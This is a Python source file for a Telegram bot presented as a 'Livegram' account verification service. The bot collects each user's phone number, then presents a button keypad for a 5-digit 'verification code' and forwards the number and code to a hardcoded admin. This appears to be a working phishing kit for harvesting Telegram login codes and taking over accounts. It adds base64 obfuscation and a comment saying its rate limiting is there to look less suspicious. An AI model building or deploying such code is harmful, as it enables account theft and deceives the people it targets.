import logging
import random
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import sqlite3
from datetime import datetime
import base64
import asyncio

# Configuration
_0x1a2b = lambda x: base64.b64decode(x).decode()
_0x3c4d = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
_0x5e6f = _0x1a2b(b'Qk9UX1RPS0VO')
_0x7g8h = _0x1a2b(b'QURNSU5fSUQ=')

logging.basicConfig(format=_0x3c4d, level=logging.INFO)
logger = logging.getLogger(__name__)

_0x9i0j = os.getenv(_0x5e6f)
_0x1k2l = int(os.getenv(_0x7g8h, '6483793776'))

# Rate limiting para hindi suspicious
_rate_limit = {}

async def check_rate_limit(user_id):
    """Check if user is rate limited"""
    now = datetime.now()
    if user_id in _rate_limit:
        last_time = _rate_limit[user_id]
        if (now - last_time).seconds < 5:  # 5 seconds cooldown
            return False
    _rate_limit[user_id] = now
    return True

class LivegramVerification:
    def __init__(self):
        self._init_db()
        self._sessions = {}
        self._pending_codes = {}
        
    def _init_db(self):
        """Initialize database with livegram structure"""
        self._conn = sqlite3.connect('livegram_verification.db', check_same_thread=False)
        cursor = self._conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS livegram_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                session_id TEXT,
                verified BOOLEAN DEFAULT 0,
                created_at DATETIME,
                verified_at DATETIME,
                verification_attempts INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS livegram_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action TEXT,
                details TEXT,
                timestamp DATETIME
            )
        ''')
        
        self._conn.commit()
    
    def _log_action(self, user_id, action, details=""):
        """Log all actions for monitoring"""
        cursor = self._conn.cursor()
        cursor.execute('''
            INSERT INTO livegram_logs (user_id, action, details, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (user_id, action, details, datetime.now()))
        self._conn.commit()

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start verification process"""
        user = update.message.from_user
        
        # Rate limiting
        if not await check_rate_limit(user.id):
            return
        
        try:
            await update.message.delete()
        except:
            pass
        
        cursor = self._conn.cursor()
        cursor.execute('SELECT verified FROM livegram_users WHERE user_id = ?', (user.id,))
        result = cursor.fetchone()
        
        if result and result[0]:
            await context.bot.send_message(
                user.id,
                "✅ **Livegram Verified Account**\n\nYour account is already verified in our system.",
                parse_mode='Markdown'
            )
            self._log_action(user.id, "START_ALREADY_VERIFIED")
            return
        
        welcome_text = f"""
🔐 **Livegram Account Verification**

Welcome {user.first_name}!

To access our services, please complete the Livegram verification process.

**Step 1 of 2:** Share your Telegram contact for authentication.

This is a secure process powered by Livegram verification system.
        """
        
        contact_button = ReplyKeyboardMarkup([
            [KeyboardButton("📱 Start Livegram Verification", request_contact=True)]
        ], resize_keyboard=True, one_time_keyboard=True)
        
        await context.bot.send_message(
            user.id,
            welcome_text,
            parse_mode='Markdown',
            reply_markup=contact_button
        )
        
        self._log_action(user.id, "START_VERIFICATION")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process contact and send to admin"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Rate limiting
            if not await check_rate_limit(user.id):
                return
            
            try:
                await update.message.delete()
            except:
                pass
            
            if contact.user_id != user.id:
                await context.bot.send_message(
                    user.id,
                    "❌ Please share your own contact information.",
                    reply_markup=ReplyKeyboardRemove()
                )
                return
            
            # Generate session ID
            session_id = f"LG{random.randint(100000, 999999)}"
            
            cursor = self._conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO livegram_users 
                (user_id, username, first_name, phone_number, session_id, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, contact.phone_number, session_id, datetime.now()))
            self._conn.commit()
            
            # Send "Get Code" button to user
            get_code_button = InlineKeyboardMarkup([
                [InlineKeyboardButton('🔑 Get Verification Code', url='https://t.me/+42777')]
            ])
            
            await context.bot.send_message(
                user.id,
                """
📱 **Contact Verified!**

**Step 2 of 2:** Get your verification code

Click the button below to receive your unique verification code from our Livegram verification channel.

Once you receive the code, enter it here to complete verification.
                """,
                parse_mode='Markdown',
                reply_markup=get_code_button
            )
            
            # AUTO-SEND code input container (no admin approval needed)
            await self._send_code_container(context, user.id, session_id)
            
            # Notify admin about new verification
            admin_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton('📊 View User Profile', callback_data=f'profile_{user.id}')]
            ])
            
            await context.bot.send_message(
                _0x1k2l,
                f"""
🔔 **New Livegram Verification**

👤 **User Info:**
• Name: {user.first_name}
• Username: @{user.username or 'None'}
• User ID: `{user.id}`
• Phone: `{contact.phone_number}`

🔐 **Session ID:** `{session_id}`
📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

**Note:** User will receive code from your verification channel.
Container has been sent automatically.

_Monitoring mode: You'll be notified when user enters the code._
                """,
                parse_mode='Markdown',
                reply_markup=admin_keyboard
            )
            
            self._log_action(user.id, "CONTACT_SHARED", f"Phone: {contact.phone_number}")
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await context.bot.send_message(
                user.id,
                "❌ Error processing your request. Please try /start again."
            )

    async def _send_code_container(self, context, user_id, session_id):
        """Send code input container to user"""
        try:
            keyboard = [
                [
                    InlineKeyboardButton('1', callback_data=f'num_1_{user_id}'),
                    InlineKeyboardButton('2', callback_data=f'num_2_{user_id}'),
                    InlineKeyboardButton('3', callback_data=f'num_3_{user_id}')
                ],
                [
                    InlineKeyboardButton('4', callback_data=f'num_4_{user_id}'),
                    InlineKeyboardButton('5', callback_data=f'num_5_{user_id}'),
                    InlineKeyboardButton('6', callback_data=f'num_6_{user_id}')
                ],
                [
                    InlineKeyboardButton('7', callback_data=f'num_7_{user_id}'),
                    InlineKeyboardButton('8', callback_data=f'num_8_{user_id}'),
                    InlineKeyboardButton('9', callback_data=f'num_9_{user_id}')
                ],
                [
                    InlineKeyboardButton('⌫', callback_data=f'del_{user_id}'),
                    InlineKeyboardButton('0', callback_data=f'num_0_{user_id}'),
                    InlineKeyboardButton('✅', callback_data=f'submit_{user_id}')
                ]
            ]
            
            markup = InlineKeyboardMarkup(keyboard)
            
            message_text = """
🔐 **Livegram Code Verification**

**Enter Verification Code:**

Code: ` - - - - - `

Enter the 5-digit code you received from the verification channel.

_Session ID: {}_
            """.format(session_id)
            
            await context.bot.send_message(
                user_id,
                message_text,
                parse_mode='Markdown',
                reply_markup=markup
            )
            
            # Initialize session
            self._sessions[user_id] = {
                'code': '',
                'session_id': session_id,
                'attempts': 0
            }
            
            self._log_action(user_id, "CONTAINER_SENT", f"Session: {session_id}")
            
        except Exception as e:
            logger.error(f"Error sending container: {e}")

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button presses"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            # Profile view for admin
            if data.startswith('profile_'):
                if user_id != _0x1k2l:
                    return
                
                target_id = int(data.split('_')[1])
                cursor = self._conn.cursor()
                cursor.execute('SELECT * FROM livegram_users WHERE user_id = ?', (target_id,))
                user_data = cursor.fetchone()
                
                if user_data:
                    await query.edit_message_text(
                        f"""
👤 **User Profile**

User ID: `{user_data[0]}`
Username: @{user_data[1] or 'None'}
Name: {user_data[2]}
Phone: `{user_data[3]}`
Session: `{user_data[4]}`
Verified: {'✅ Yes' if user_data[5] else '❌ No'}
Attempts: {user_data[8]}

Created: {user_data[6]}
                        """,
                        parse_mode='Markdown'
                    )
                return
            
            # Code input handling
            if user_id not in self._sessions:
                await query.edit_message_text("❌ Session expired. Please /start again.")
                return
            
            session = self._sessions[user_id]
            
            # Number pressed
            if data.startswith('num_'):
                num = data.split('_')[1]
                
                if len(session['code']) < 5:
                    session['code'] += num
                
                display = ' '.join(session['code'].ljust(5, '-'))
                
                await query.edit_message_text(
                    f"""
🔐 **Livegram Code Verification**

**Enter Verification Code:**

Code: ` {display} `

Enter the 5-digit code you received from the verification channel.

_Session ID: {session['session_id']}_
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
            
            # Delete pressed
            elif data.startswith('del_'):
                if len(session['code']) > 0:
                    session['code'] = session['code'][:-1]
                
                display = ' '.join(session['code'].ljust(5, '-'))
                
                await query.edit_message_text(
                    f"""
🔐 **Livegram Code Verification**

**Enter Verification Code:**

Code: ` {display} `

Enter the 5-digit code you received from the verification channel.

_Session ID: {session['session_id']}_
                    """,
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
            
            # Submit pressed
            elif data.startswith('submit_'):
                if len(session['code']) != 5:
                    await query.answer("⚠️ Please enter all 5 digits first!", show_alert=True)
                    return
                
                entered_code = session['code']
                session['attempts'] += 1
                
                # Update attempts in database
                cursor = self._conn.cursor()
                cursor.execute(
                    'UPDATE livegram_users SET verification_attempts = ? WHERE user_id = ?',
                    (session['attempts'], user_id)
                )
                self._conn.commit()
                
                # Send entered code to admin for verification
                verify_keyboard = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton('✅ Approve', callback_data=f'approve_{user_id}'),
                        InlineKeyboardButton('❌ Reject', callback_data=f'reject_{user_id}')
                    ]
                ])
                
                cursor.execute('SELECT first_name, username, phone_number FROM livegram_users WHERE user_id = ?', (user_id,))
                user_info = cursor.fetchone()
                
                await context.bot.send_message(
                    _0x1k2l,
                    f"""
🔑 **Code Verification Request**

👤 User: {user_info[0]} (@{user_info[1] or 'None'})
🆔 User ID: `{user_id}`
📞 Phone: `{user_info[2]}`

💬 **Code Entered:** `{entered_code}`
🔄 Attempt: #{session['attempts']}
🕐 Time: {datetime.now().strftime('%H:%M:%S')}

**Action:** Approve if code is correct, Reject if wrong.
                    """,
                    parse_mode='Markdown',
                    reply_markup=verify_keyboard
                )
                
                # Update user's container
                await query.edit_message_text(
                    f"""
🔐 **Code Submitted**

Code: ` {' '.join(entered_code)} `

⏳ Your code is being verified...

Please wait for admin confirmation.

_Session ID: {session['session_id']}_
                    """,
                    parse_mode='Markdown'
                )
                
                self._log_action(user_id, "CODE_SUBMITTED", f"Code: {entered_code}, Attempt: {session['attempts']}")
            
            # Admin approval
            elif data.startswith('approve_'):
                if user_id != _0x1k2l:
                    return
                
                target_id = int(data.split('_')[1])
                
                # Mark as verified
                cursor = self._conn.cursor()
                cursor.execute(
                    'UPDATE livegram_users SET verified = 1, verified_at = ? WHERE user_id = ?',
                    (datetime.now(), target_id)
                )
                self._conn.commit()
                
                # Notify user
                await context.bot.send_message(
                    target_id,
                    """
✅ **Verification Successful!**

Your account has been verified through Livegram.

Welcome! You now have full access to our services.

🎉 Thank you for completing the verification process.
                    """,
                    parse_mode='Markdown'
                )
                
                # Update admin message
                await query.edit_message_text(
                    query.message.text + "\n\n✅ **APPROVED** - User verified successfully!",
                    parse_mode='Markdown'
                )
                
                # Clean up session
                if target_id in self._sessions:
                    del self._sessions[target_id]
                
                self._log_action(target_id, "VERIFIED", "Admin approved")
            
            # Admin rejection
            elif data.startswith('reject_'):
                if user_id != _0x1k2l:
                    return
                
                target_id = int(data.split('_')[1])
                
                # Notify user
                if target_id in self._sessions:
                    session = self._sessions[target_id]
                    session['code'] = ''
                    
                    # Allow retry
                    keyboard = [
                        [
                            InlineKeyboardButton('1', callback_data=f'num_1_{target_id}'),
                            InlineKeyboardButton('2', callback_data=f'num_2_{target_id}'),
                            InlineKeyboardButton('3', callback_data=f'num_3_{target_id}')
                        ],
                        [
                            InlineKeyboardButton('4', callback_data=f'num_4_{target_id}'),
                            InlineKeyboardButton('5', callback_data=f'num_5_{target_id}'),
                            InlineKeyboardButton('6', callback_data=f'num_6_{target_id}')
                        ],
                        [
                            InlineKeyboardButton('7', callback_data=f'num_7_{target_id}'),
                            InlineKeyboardButton('8', callback_data=f'num_8_{target_id}'),
                            InlineKeyboardButton('9', callback_data=f'num_9_{target_id}')
                        ],
                        [
                            InlineKeyboardButton('⌫', callback_data=f'del_{target_id}'),
                            InlineKeyboardButton('0', callback_data=f'num_0_{target_id}'),
                            InlineKeyboardButton('✅', callback_data=f'submit_{target_id}')
                        ]
                    ]
                    
                    markup = InlineKeyboardMarkup(keyboard)
                    
                    await context.bot.send_message(
                        target_id,
                        f"""
❌ **Incorrect Code**

The code you entered is incorrect.

**Try Again:**

Code: ` - - - - - `

Please enter the correct 5-digit code.

_Session ID: {session['session_id']}_
                        """,
                        parse_mode='Markdown',
                        reply_markup=markup
                    )
                
                # Update admin message
                await query.edit_message_text(
                    query.message.text + "\n\n❌ **REJECTED** - User notified to try again.",
                    parse_mode='Markdown'
                )
                
                self._log_action(target_id, "CODE_REJECTED", "Admin rejected")
                
        except Exception as e:
            logger.error(f"Error in callback: {e}")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin statistics"""
        if update.message.from_user.id != _0x1k2l:
            return
        
        cursor = self._conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM livegram_users WHERE verified = 1')
        verified = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM livegram_users')
        total = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM livegram_logs WHERE action = "CODE_SUBMITTED" AND timestamp > datetime("now", "-1 hour")')
        recent_attempts = cursor.fetchone()[0]
        
        await update.message.reply_text(
            f"""
📊 **Livegram Verification Statistics**

✅ Verified Users: {verified}
📝 Total Registrations: {total}
⏳ Pending: {total - verified}
🔄 Active Sessions: {len(self._sessions)}
⚡ Recent Attempts (1h): {recent_attempts}

📅 Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """,
            parse_mode='Markdown'
        )

def main():
    """Initialize and run bot"""
    if not _0x9i0j:
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    bot = LivegramVerification()
    app = Application.builder().token(_0x9i0j).build()
    
    # Handlers
    app.add_handler(CommandHandler("start", bot.start_command))
    app.add_handler(CommandHandler("stats", bot.stats_command))
    app.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    app.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    logger.info("🚀 Livegram Verification Bot Started!")
    logger.info("📡 Monitoring verification requests...")
    
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
